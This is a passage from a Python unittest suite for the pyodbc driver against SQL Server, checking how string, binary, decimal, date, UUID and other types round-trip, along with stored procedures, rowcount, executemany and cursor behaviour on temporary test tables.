        self.assertEqual(self.cursor.noscan, True)

    def test_nonnative_uuid(self):
        # The default is False meaning we should return a string.  Note that
        # SQL Server seems to always return uppercase.
        value = uuid.uuid4()
        self.cursor.execute(""create table t1(n uniqueidentifier)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        pyodbc.native_uuid = False
        result = self.cursor.execute(""select n from t1"").fetchval()
        self.assertEqual(type(result), str)
        self.assertEqual(result, str(value).upper())

    def test_native_uuid(self):
        # When true, we should return a uuid.UUID object.
        value = uuid.uuid4()
        self.cursor.execute(""create table t1(n uniqueidentifier)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        pyodbc.native_uuid = True
        result = self.cursor.execute(""select n from t1"").fetchval()
        self.assertIsInstance(result, uuid.UUID)
        self.assertEqual(value, result)

    def test_nextset(self):
        self.cursor.execute(""create table t1(i int)"")
        for i in range(4):
            self.cursor.execute(""insert into t1(i) values(?)"", i)

        self.cursor.execute(""select i from t1 where i < 2 order by i; select i from t1 where i >= 2 order by i"")

        for i, row in enumerate(self.cursor):
            self.assertEqual(i, row.i)

        self.assertEqual(self.cursor.nextset(), True)

        for i, row in enumerate(self.cursor):
            self.assertEqual(i + 2, row.i)

    def test_nextset_with_raiserror(self):
        self.cursor.execute(""select i = 1; RAISERROR('c', 16, 1);"")
        row = next(self.cursor)
        self.assertEqual(1, row.i)
        self.assertRaises(pyodbc.ProgrammingError, self.cursor.nextset)

    def test_fixed_unicode(self):
        value = ""t\xebsting""
        self.cursor.execute(""create table t1(s nchar(7))"")
        self.cursor.execute(""insert into t1 values(?)"", ""t\xebsting"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), str)
        self.assertEqual(len(v), len(value)) # If we alloc'd wrong, the test below might work because of an embedded NULL
        self.assertEqual(v, value)


    def _test_strtype(self, sqltype, value, resulttype=None, colsize=None):
        """"""
        The implementation for string, Unicode, and binary tests.
        """"""
        assert colsize is None or isinstance(colsize, int), colsize
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = ""create table t1(s %s(%s))"" % (sqltype, colsize)
        else:
            sql = ""create table t1(s %s)"" % sqltype

        if resulttype is None:
            resulttype = type(value)

        self.cursor.execute(sql)
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), resulttype)

        if value is not None:
            self.assertEqual(len(v), len(value))

        # To allow buffer --> db --> bytearray tests, always convert the input to the expected result type before
        # comparing.
        if type(value) is not resulttype:
            value = resulttype(value)

        self.assertEqual(v, value)


    def _test_strliketype(self, sqltype, value, resulttype=None, colsize=None):
        """"""
        The implementation for text, image, ntext, and binary.

        These types do not support comparison operators.
        """"""
        assert colsize is None or isinstance(colsize, int), colsize
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = ""create table t1(s %s(%s))"" % (sqltype, colsize)
        else:
            sql = ""create table t1(s %s)"" % sqltype

        if resulttype is None:
            resulttype = type(value)

        self.cursor.execute(sql)
        self.cursor.execute(""insert into t1 values(?)"", value)
        result = self.cursor.execute(""select * from t1"").fetchone()[0]

        self.assertEqual(type(result), resulttype)

        # To allow buffer --> db --> bytearray tests, always convert the input to the expected result type before
        # comparing.
        if type(value) is not resulttype:
            value = resulttype(value)

        self.assertEqual(result, value)


    #
    # varchar
    #

    def test_varchar_null(self):
        self._test_strtype('varchar', None, colsize=100)

    # Generate a test for each fencepost size: test_varchar_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('varchar', value, colsize=len(value))
        return t
    for value in STR_FENCEPOSTS:
        locals()['test_varchar_%s' % len(value)] = _maketest(value)

    def test_varchar_many(self):
        self.cursor.execute(""create table t1(c1 varchar(300), c2 varchar(300), c3 varchar(300))"")

        v1 = 'ABCDEFGHIJ' * 30
        v2 = '0123456789' * 30
        v3 = '9876543210' * 30

        self.cursor.execute(""insert into t1(c1, c2, c3) values (?,?,?)"", v1, v2, v3);
        row = self.cursor.execute(""select c1, c2, c3, len(c1) as l1, len(c2) as l2, len(c3) as l3 from t1"").fetchone()

        self.assertEqual(v1, row.c1)
        self.assertEqual(v2, row.c2)
        self.assertEqual(v3, row.c3)

    #
    # nvarchar
    #

    def test_unicode_null(self):
        self._test_strtype('nvarchar', None, colsize=100)

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('nvarchar', value, colsize=len(value))
        return t
    for value in STR_FENCEPOSTS:
        locals()['test_unicode_%s' % len(value)] = _maketest(value)

    def test_unicode_longmax(self):
        # Issue 188:	Segfault when fetching NVARCHAR(MAX) data over 511 bytes

        ver = self.get_sqlserver_version()
        if ver < 9:            # 2005+
            return              # so pass / ignore
        self.cursor.execute(""select cast(replicate(N'x', 512) as nvarchar(max))"")

    # From issue #206
    def _maketest(value):
        def t(self):
            self._test_strtype('nvarchar', value, colsize=len(value))
        return t
    locals()['test_chinese_param'] = _maketest('我的')

    def test_chinese(self):
        v = '我的'
        self.cursor.execute(u""SELECT N'我的' AS [Name]"")
        row = self.cursor.fetchone()
        self.assertEqual(row[0], v)

        self.cursor.execute(u""SELECT N'我的' AS [Name]"")
        rows = self.cursor.fetchall()
        self.assertEqual(rows[0][0], v)


    #
    # binary
    #

    def test_binary_null(self):
        self._test_strtype('varbinary', None, colsize=100)

    # bytearray

    def _maketest(value):
        def t(self):
            self._test_strtype('varbinary', bytearray(value), colsize=len(value), resulttype=bytes)
        return t
    for value in BYTE_FENCEPOSTS:
        locals()['test_binary_bytearray_%s' % len(value)] = _maketest(value)

    # bytes

    def _maketest(value):
        def t(self):
            self._test_strtype('varbinary', bytes(value), colsize=len(value))
        return t
    for value in BYTE_FENCEPOSTS:
        locals()['test_binary_bytes_%s' % len(value)] = _maketest(value)

    #
    # image
    #

    def test_image_null(self):
        self._test_strliketype('image', None)

    # bytearray

    def _maketest(value):
        def t(self):
            self._test_strliketype('image', bytearray(value), resulttype=bytes)
        return t
    for value in IMAGE_FENCEPOSTS:
        locals()['test_image_bytearray_%s' % len(value)] = _maketest(value)

    # bytes

    def _maketest(value):
        def t(self):
            self._test_strliketype('image', bytes(value))
        return t
    for value in IMAGE_FENCEPOSTS:
        locals()['test_image_bytes_%s' % len(value)] = _maketest(value)

    #
    # text
    #

    def test_null_text(self):
        self._test_strliketype('text', None)

    def _maketest(value):
        def t(self):
            self._test_strliketype('text', value)
        return t
    for value in STR_FENCEPOSTS:
        locals()['test_text_%s' % len(value)] = _maketest(value)

    #
    # bit
    #

    def test_bit(self):
        value = True
        self.cursor.execute(""create table t1(b bit)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        v = self.cursor.execute(""select b from t1"").fetchone()[0]
        self.assertEqual(type(v), bool)
        self.assertEqual(v, value)

    #
    # decimal
    #

    def _decimal(self, precision, scale, negative):
        # From test provided by planders (thanks!) in Issue 91

        self.cursor.execute(""create table t1(d decimal(%s, %s))"" % (precision, scale))

        # Construct a decimal that uses the maximum precision and scale.
        decStr = '9' * (precision - scale)
        if scale:
            decStr = decStr + ""."" + '9' * scale
        if negative:
            decStr = ""-"" + decStr

        value = Decimal(decStr)

        self.cursor.execute(""insert into t1 values(?)"", value)

        v = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(v, value)

    def _maketest(p, s, n):
        def t(self):
            self._decimal(p, s, n)
        return t
    for (p, s, n) in [ (1,  0,  False),
                       (1,  0,  True),
                       (6,  0,  False),
                       (6,  2,  False),
                       (6,  4,  True),
                       (6,  6,  True),
                       (38, 0,  False),
                       (38, 10, False),
                       (38, 38, False),
                       (38, 0,  True),
                       (38, 10, True),
                       (38, 38, True) ]:
        locals()['test_decimal_%s_%s_%s' % (p, s, n and 'n' or 'p')] = _maketest(p, s, n)


    def test_decimal_e(self):
        """"""Ensure exponential notation decimals are properly handled""""""
        value = Decimal((0, (1, 2, 3), 5)) # prints as 1.23E+7
        self.cursor.execute(""create table t1(d decimal(10, 2))"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_subquery_params(self):
        """"""Ensure parameter markers work in a subquery""""""
        self.cursor.execute(""create table t1(id integer, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (?,?)"", 1, 'test')
        row = self.cursor.execute(""""""
                                  select x.id
                                  from (
                                    select id
                                    from t1
                                    where s = ?
                                      and id between ? and ?
                                   ) x
                                   """""", 'test', 1, 10).fetchone()
        self.assertNotEqual(row, None)
        self.assertEqual(row[0], 1)

    def _exec(self):
        self.cursor.execute(self.sql)

    def test_close_cnxn(self):
        """"""Make sure using a Cursor after closing its connection doesn't crash.""""""

        self.cursor.execute(""create table t1(id integer, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (?,?)"", 1, 'test')
        self.cursor.execute(""select * from t1"")

        self.cnxn.close()

        # Now that the connection is closed, we expect an exception.  (If the code attempts to use
        # the HSTMT, we'll get an access violation instead.)
        self.sql = ""select * from t1""
        self.assertRaises(pyodbc.ProgrammingError, self._exec)

    def test_empty_string(self):
        self.cursor.execute(""create table t1(s varchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", """")

    def test_empty_string_encoding(self):
        self.cnxn.setdecoding(pyodbc.SQL_CHAR, encoding='shift_jis')
        value = """"
        self.cursor.execute(""create table t1(s varchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(v, value)

    def test_fixed_str(self):
        value = ""testing""
        self.cursor.execute(""create table t1(s char(7))"")
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), str)
        self.assertEqual(len(v), len(value)) # If we alloc'd wrong, the test below might work because of an embedded NULL
        self.assertEqual(v, value)

    def test_empty_unicode(self):
        self.cursor.execute(""create table t1(s nvarchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", """")

    def test_empty_unicode_encoding(self):
        self.cnxn.setdecoding(pyodbc.SQL_CHAR, encoding='shift_jis')
        value = """"
        self.cursor.execute(""create table t1(s nvarchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(v, value)

    def test_negative_row_index(self):
        self.cursor.execute(""create table t1(s varchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", ""1"")
        row = self.cursor.execute(""select * from t1"").fetchone()
        self.assertEqual(row[0], ""1"")
        self.assertEqual(row[-1], ""1"")

    def test_version(self):
        self.assertEqual(3, len(pyodbc.version.split('.'))) # 1.3.1 etc.

    #
    # date, time, datetime
    #

    def test_datetime(self):
        value = datetime(2007, 1, 15, 3, 4, 5)

        self.cursor.execute(""create table t1(dt datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(type(value), datetime)
        self.assertEqual(value, result)

    def test_datetime_fraction(self):
        # SQL Server supports milliseconds, but Python's datetime supports nanoseconds, so the most granular datetime
        # supported is xxx000.

        value = datetime(2007, 1, 15, 3, 4, 5, 123000)

        self.cursor.execute(""create table t1(dt datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(type(value), datetime)
        self.assertEqual(result, value)

    def test_datetime_fraction_rounded(self):
        # SQL Server supports milliseconds, but Python's datetime supports nanoseconds.  pyodbc rounds down to what the
        # database supports.

        full    = datetime(2007, 1, 15, 3, 4, 5, 123456)
        rounded = datetime(2007, 1, 15, 3, 4, 5, 123000)

        self.cursor.execute(""create table t1(dt datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", full)

        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(type(result), datetime)
        self.assertEqual(result, rounded)

    def test_date(self):
        ver = self.get_sqlserver_version()
        if ver < 10:            # 2008 only
            return              # so pass / ignore

        value = date.today()

        self.cursor.execute(""create table t1(d date)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        result = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(type(value), date)
        self.assertEqual(value, result)

    def test_time(self):
        ver = self.get_sqlserver_version()
        if ver < 10:            # 2008 only
            return              # so pass / ignore

        value = datetime.now().time()

        # We aren't yet writing values using the new extended time type so the value written to the database is only
        # down to the second.
        value = value.replace(microsecond=0)

        self.cursor.execute(""create table t1(t time)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        result = self.cursor.execute(""select t from t1"").fetchone()[0]
        self.assertEqual(type(value), time)
        self.assertEqual(value, result)

    def test_datetime2(self):
        value = datetime(2007, 1, 15, 3, 4, 5)

        self.cursor.execute(""create table t1(dt datetime2)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(type(value), datetime)
        self.assertEqual(value, result)

    #
    # ints and floats
    #

    def test_int(self):
        value = 1234
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_int(self):
        value = -1
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_bigint(self):
        input = 3000000000
        self.cursor.execute(""create table t1(d bigint)"")
        self.cursor.execute(""insert into t1 values (?)"", input)
        result = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(result, input)

    def test_float(self):
        value = 1234.567
        self.cursor.execute(""create table t1(n float)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_float(self):
        value = -200
        self.cursor.execute(""create table t1(n float)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result  = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(value, result)

    #
    # stored procedures
    #

    # def test_callproc(self):
    #     ""callproc with a simple input-only stored procedure""
    #     pass

    def test_sp_results(self):
        self.cursor.execute(
            """"""
            Create procedure proc1
            AS
              select top 10 name, id, xtype, refdate
              from sysobjects
            """""")
        rows = self.cursor.execute(""exec proc1"").fetchall()
        self.assertEqual(type(rows), list)
        self.assertEqual(len(rows), 10) # there has to be at least 10 items in sysobjects
        self.assertEqual(type(rows[0].refdate), datetime)


    def test_sp_results_from_temp(self):

        # Note: I've used ""set nocount on"" so that we don't get the number of rows deleted from #tmptable.
        # If you don't do this, you'd need to call nextset() once to skip it.

        self.cursor.execute(
            """"""
            Create procedure proc1
            AS
              set nocount on
              select top 10 name, id, xtype, refdate
              into #tmptable
              from sysobjects

              select * from #tmptable
            """""")
        self.cursor.execute(""exec proc1"")
        self.assertTrue(self.cursor.description is not None)
        self.assertTrue(len(self.cursor.description) == 4)

        rows = self.cursor.fetchall()
        self.assertEqual(type(rows), list)
        self.assertEqual(len(rows), 10) # there has to be at least 10 items in sysobjects
        self.assertEqual(type(rows[0].refdate), datetime)


    def test_sp_results_from_vartbl(self):
        self.cursor.execute(
            """"""
            Create procedure proc1
            AS
              set nocount on
              declare @tmptbl table(name varchar(100), id int, xtype varchar(4), refdate datetime)

              insert into @tmptbl
              select top 10 name, id, xtype, refdate
              from sysobjects

              select * from @tmptbl
            """""")
        self.cursor.execute(""exec proc1"")
        rows = self.cursor.fetchall()
        self.assertEqual(type(rows), list)
        self.assertEqual(len(rows), 10) # there has to be at least 10 items in sysobjects
        self.assertEqual(type(rows[0].refdate), datetime)

    def test_sp_with_dates(self):
        # Reported in the forums that passing two datetimes to a stored procedure doesn't work.
        self.cursor.execute(
            """"""
            if exists (select * from dbo.sysobjects where id = object_id(N'[test_sp]') and OBJECTPROPERTY(id, N'IsProcedure') = 1)
              drop procedure [dbo].[test_sp]
            """""")
        self.cursor.execute(
            """"""
            create procedure test_sp(@d1 datetime, @d2 datetime)
            AS
              declare @d as int
              set @d = datediff(year, @d1, @d2)
              select @d
            """""")
        self.cursor.execute(""exec test_sp ?, ?"", datetime.now(), datetime.now())
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(rows[0][0] == 0)   # 0 years apart

    def test_sp_with_none(self):
        # Reported in the forums that passing None caused an error.
        self.cursor.execute(
            """"""
            if exists (select * from dbo.sysobjects where id = object_id(N'[test_sp]') and OBJECTPROPERTY(id, N'IsProcedure') = 1)
              drop procedure [dbo].[test_sp]
            """""")
        self.cursor.execute(
            """"""
            create procedure test_sp(@x varchar(20))
            AS
              declare @y varchar(20)
              set @y = @x
              select @y
            """""")
        self.cursor.execute(""exec test_sp ?"", None)
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(rows[0][0] == None)   # 0 years apart


    #
    # rowcount
    #

    def test_rowcount_delete(self):
        self.assertEqual(self.cursor.rowcount, -1)
        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.cursor.execute(""delete from t1"")
        self.assertEqual(self.cursor.rowcount, count)

    def test_rowcount_nodata(self):
        """"""
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.  On the other hand, we could hardcode a
        zero return value.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        # This is a different code path internally.
        self.cursor.execute(""delete from t1"")
        self.assertEqual(self.cursor.rowcount, 0)

    def test_rowcount_select(self):
        """"""
        Ensure Cursor.rowcount is set properly after a select statement.

        pyodbc calls SQLRowCount after each execute and sets Cursor.rowcount, but SQL Server 2005 returns -1 after a
        select statement, so we'll test for that behavior.  This is valid behavior according to the DB API
        specification, but people don't seem to like it.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.cursor.execute(""select * from t1"")
        self.assertEqual(self.cursor.rowcount, -1)

        rows = self.cursor.fetchall()
        self.assertEqual(len(rows), count)
        self.assertEqual(self.cursor.rowcount, -1)

    def test_rowcount_reset(self):
        ""Ensure rowcount is reset to -1""

        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.assertEqual(self.cursor.rowcount, 1)

        self.cursor.execute(""create table t2(i int)"")
        self.assertEqual(self.cursor.rowcount, -1)

    #
    # always return Cursor
    #

    # In the 2.0.x branch, Cursor.execute sometimes returned the cursor and sometimes the rowcount.  This proved very
    # confusing when things went wrong and added very little value even when things went right since users could always
    # use: cursor.execute(""..."").rowcount

    def test_retcursor_delete(self):
        self.cursor.execute(""create table t1(i int)"")
        self.cursor.execute(""insert into t1 values (1)"")
        v = self.cursor.execute(""delete from t1"")
        self.assertEqual(v, self.cursor)

    def test_retcursor_nodata(self):
        """"""
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        # This is a different code path internally.
        v = self.cursor.execute(""delete from t1"")
        self.assertEqual(v, self.cursor)

    def test_retcursor_select(self):
        self.cursor.execute(""create table t1(i int)"")
        self.cursor.execute(""insert into t1 values (1)"")
        v = self.cursor.execute(""select * from t1"")
        self.assertEqual(v, self.cursor)

    #
    # misc
    #

    def table_with_spaces(self):
        ""Ensure we can select using [x z] syntax""

        try:
            self.cursor.execute(""create table [test one](int n)"")
            self.cursor.execute(""insert into [test one] values(1)"")
            self.cursor.execute(""select * from [test one]"")
            v = self.cursor.fetchone()[0]
            self.assertEqual(v, 1)
        finally:
            self.cnxn.rollback()

    def test_lower_case(self):
        ""Ensure pyodbc.lowercase forces returned column names to lowercase.""

        # Has to be set before creating the cursor, so we must recreate self.cursor.

        pyodbc.lowercase = True
        self.cursor = self.cnxn.cursor()

        self.cursor.execute(""create table t1(Abc int, dEf int)"")
        self.cursor.execute(""select * from t1"")

        names = [ t[0] for t in self.cursor.description ]
        names.sort()

        self.assertEqual(names, [ ""abc"", ""def"" ])

        # Put it back so other tests don't fail.
        pyodbc.lowercase = False

    def test_row_description(self):
        """"""
        Ensure Cursor.description is accessible as Row.cursor_description.
        """"""
        self.cursor = self.cnxn.cursor()
        self.cursor.execute(""create table t1(a int, b char(3))"")
        self.cnxn.commit()
        self.cursor.execute(""insert into t1 values(1, 'abc')"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        self.assertEqual(self.cursor.description, row.cursor_description)


    def test_temp_select(self):
        # A project was failing to create temporary tables via select into.
        self.cursor.execute(""create table t1(s char(7))"")
        self.cursor.execute(""insert into t1 values(?)"", ""testing"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), str)
        self.assertEqual(v, ""testing"")

        self.cursor.execute(""select s into t2 from t1"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), str)
        self.assertEqual(v, ""testing"")

    # Money
    #
    # The inputs are strings so we don't have to deal with floating point rounding.

    for value in ""-1234.56  -1  0  1  1234.56  123456789.21"".split():
        name = str(value).replace('.', '_').replace('-', 'neg_')
        locals()['test_money_%s' % name] = _simpletest('money', Decimal(str(value)))

    def test_executemany(self):
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (i, str(i)) for i in range(1, 6) ]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])


    def test_executemany_one(self):
        ""Pass executemany a single sequence""
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (1, ""test"") ]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])


    def test_executemany_failure(self):
        """"""
        Ensure that an exception is raised if one query in an executemany fails.
        """"""
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (1, 'good'),
                   ('error', 'not an int'),
                   (3, 'good') ]

        self.assertRaises(pyodbc.Error, self.cursor.executemany, ""insert into t1(a, b) value (?, ?)"", params)


    def test_row_slicing(self):
        self.cursor.execute(""create table t1(a int, b int, c int, d int)"");
        self.cursor.execute(""insert into t1 values(1,2,3,4)"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        result = row[:]
        self.assertTrue(result is row)

        result = row[:-1]
        self.assertEqual(result, (1,2,3))

        result = row[0:4]
        self.assertTrue(result is row)


    def test_row_repr(self):
        self.cursor.execute(""create table t1(a int, b int, c int, d int)"");
        self.cursor.execute(""insert into t1 values(1,2,3,4)"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        result = str(row)
        self.assertEqual(result, ""(1, 2, 3, 4)"")

        result = str(row[:-1])
        self.assertEqual(result, ""(1, 2, 3)"")

        result = str(row[:1])
        self.assertEqual(result, ""(1,)"")


    def test_concatenation(self):
        v2 = '0123456789' * 30
        v3 = '9876543210' * 30

        self.cursor.execute(""create table t1(c1 int identity(1, 1), c2 varchar(300), c3 varchar(300))"")
        self.cursor.execute(""insert into t1(c2, c3) values (?,?)"", v2, v3)

        row = self.cursor.execute(""select c2, c3, c2 + c3 as both from t1"").fetchone()

        self.assertEqual(row.both, v2 + v3)

    def test_view_select(self):
        # Reported in forum: Can't select from a view?  I think I do this a lot, but another test never hurts.

        # Create a table (t1) with 3 rows and a view (t2) into it.
        self.cursor.execute(""create table t1(c1 int identity(1, 1), c2 varchar(50))"")
        for i in range(3):
            self.cursor.execute(""insert into t1(c2) values (?)"", ""string%s"" % i)
        self.cursor.execute(""create view t2 as select * from t1"")

        # Select from the view
        self.cursor.execute(""select * from t2"")
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(len(rows) == 3)

    def test_autocommit(self):
        self.assertEqual(self.cnxn.autocommit, False)
        othercnxn = pyodbc.connect(self.connection_string, autocommit=True)
        self.assertEqual(othercnxn.autocommit, True)
        othercnxn.autocommit = False
        self.assertEqual(othercnxn.autocommit, False)

    def test_sqlserver_callproc(self):
        try:
            self.cursor.execute(""drop procedure pyodbctest"")
            self.cnxn.commit()
        except:
            pass

        self.cursor.execute(""create table t1(s varchar(10))"")
        self.cursor.execute(""insert into t1 values(?)"", ""testing"")

        self.cursor.execute(""""""
                            create procedure pyodbctest @var1 varchar(32)
                            as
                            begin
                              select s
                              from t1
                            return
                            end
                            """""")
        self.cnxn.commit()

        # for row in self.cursor.procedureColumns('pyodbctest'):
        #     print row.procedure_name, row.column_name, row.column_type, row.type_name

        self.cursor.execute(""exec pyodbctest 'hi'"")

        # print self.cursor.description
        # for row in self.cursor:
        #     print row.s

    def test_skip(self):
        # Insert 1, 2, and 3.  Fetch 1, skip 2, fetch 3.

        self.cursor.execute(""create table t1(id int)"");
        for i in range(1, 5):
            self.cursor.execute(""insert into t1 values(?)"", i)
        self.cursor.execute(""select id from t1 order by id"")
        self.assertEqual(self.cursor.fetchone()[0], 1)
        self.cursor.skip(2)
        self.assertEqual(self.cursor.fetchone()[0], 4)

    def test_timeout(self):
        self.assertEqual(self.cnxn.timeout, 0) # defaults to zero (off)

        self.cnxn.timeout = 30
        self.assertEqual(self.cnxn.timeout, 30)

        self.cnxn.timeout = 0
        self.assertEqual(self.cnxn.timeout, 0)

    def test_sets_execute(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute(""create table t1 (word varchar (100))"")
            words = set (['a'])
            self.cursor.execute(""insert into t1 (word) VALUES (?)"", [words])

        self.assertRaises(pyodbc.ProgrammingError, f)

    def test_sets_executemany(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute(""create table t1 (word varchar (100))"")
            words = set (['a'])
            self.cursor.executemany(""insert into t1 (word) values (?)"", [words])

        self.assertRaises(TypeError, f)

    def test_row_execute(self):
        ""Ensure we can use a Row object as a parameter to execute""
        self.cursor.execute(""create table t1(n int, s varchar(10))"")
        self.cursor.execute(""insert into t1 values (1, 'a')"")
        row = self.cursor.execute(""select n, s from t1"").fetchone()
        self.assertNotEqual(row, None)

        self.cursor.execute(""create table t2(n int, s varchar(10))"")
        self.cursor.execute(""insert into t2 values (?, ?)"", row)

    def test_row_executemany(self):
        ""Ensure we can use a Row object as a parameter to executemany""
        self.cursor.execute(""create table t1(n int, s varchar(10))"")

        for i in range(3):
            self.cursor.execute(""insert into t1 values (?, ?)"", i, chr(ord('a')+i))

        rows = self.cursor.execute(""select n, s from t1"").fetchall()
        self.assertNotEqual(len(rows), 0)

        self.cursor.execute(""create table t2(n int, s varchar(10))"")
        self.cursor.executemany(""insert into t2 values (?, ?)"", rows)

    def test_description(self):
        ""Ensure cursor.description is correct""

        self.cursor.execute(""create table t1(n int, s varchar(8), d decimal(5,2))"")
        self.cursor.execute(""insert into t1 values (1, 'abc', '1.23')"")
        self.cursor.execute(""select * from t1"")

        # (I'm not sure the precision of an int is constant across different versions, bits, so I'm hand checking the
        # items I do know.

        # int
        t = self.cursor.description[0]
        self.assertEqual(t[0], 'n')
        self.assertEqual(t[1], int)
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

        # varchar(8)
        t = self.cursor.description[1]
        self.assertEqual(t[0], 's')
        self.assertEqual(t[1], str)
        self.assertEqual(t[4], 8)       # precision
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

        # decimal(5, 2)
        t = self.cursor.description[2]
        self.assertEqual(t[0], 'd')
        self.assertEqual(t[1], Decimal)
        self.assertEqual(t[4], 5)       # precision
        self.assertEqual(t[5], 2)       # scale
        self.assertEqual(t[6], True)    # nullable


    def test_none_param(self):
        ""Ensure None can be used for params other than the first""
        # Some driver/db versions would fail if NULL was not the first parameter because SQLDescribeParam (only used
        # with NULL) could not be used after the first call to SQLBindParameter.  This means None always worked for the
        # first column, but did not work for later columns.
        #
        # If SQLDescribeParam doesn't work, pyodbc would use VARCHAR which almost always worked.  However,
        # binary/varbinary won't allow an implicit conversion.

        self.cursor.execute(""create table t1(n int, blob varbinary(max))"")
        self.cursor.execute(""insert into t1 values (1, newid())"")
        row = self.cursor.execute(""select * from t1"").fetchone()
        self.assertEqual(row.n, 1)
        self.assertEqual(type(row.blob), bytes)

        self.cursor.execute(""update t1 set n=?, blob=?"", 2, None)
        row = self.cursor.execute(""select * from t1"").fetchone()
        self.assertEqual(row.n, 2)
        self.assertEqual(row.blob, None)


    def test_output_conversion(self):
        def convert(value):
            # The value is the raw bytes (as a bytes object) read from the
            # database.  We'll simply add an X at the beginning at the end.
            return 'X' + value.decode('latin1') + 'X'
        self.cnxn.add_output_converter(pyodbc.SQL_VARCHAR, convert)
        self.cursor.execute(""create table t1(n int, v varchar(10))"")
        self.cursor.execute(""insert into t1 values (1, '123.45')"")
        value = self.cursor.execute(""select v from t1"").fetchone()[0]
        self.assertEqual(value, 'X123.45X')

        # Now clear the conversions and try again.  There should be no Xs this time.
        self.cnxn.clear_output_converters()
